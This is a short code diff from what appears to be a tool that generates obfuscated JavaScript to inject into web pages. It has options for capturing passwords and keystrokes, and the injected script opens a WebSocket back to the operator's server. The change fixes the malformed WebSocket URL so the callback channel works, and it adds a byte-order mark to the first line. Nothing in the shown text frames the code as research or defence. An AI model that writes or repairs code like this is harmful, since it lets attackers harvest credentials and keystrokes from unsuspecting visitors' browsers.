@@ -1,4 +1,4 @@
-import chalk from 'chalk'
+﻿import chalk from 'chalk'
 import { URL } from 'url';
 const UglifyJS = require('uglify-es')
 const ObfuscateJS = require('js-obfuscator')
@@ -129,7 +129,7 @@ export default (query: any) => {
 
       if (inject) {
         let websocket = `'${url.protocol === 'https:' ? 'wss' : 'ws'}:'+p+'i?${injectProject}'`
-        if (query.passwords === 'false' && keylogger === false) websocket = `'${url.protocol === 'https:' ? 'wss' : 'ws'}${url.host}/i?${injectProject}'`
+        if (query.passwords === 'false' && keylogger === false) websocket = `'${url.protocol === 'https:' ? 'wss' : 'ws'}//${url.host}/i?${injectProject}'`
         body += `
           function u() {` + comment('Open a new websocket to the server') + `
             window.ws = new WebSocket(` + websocket + `)
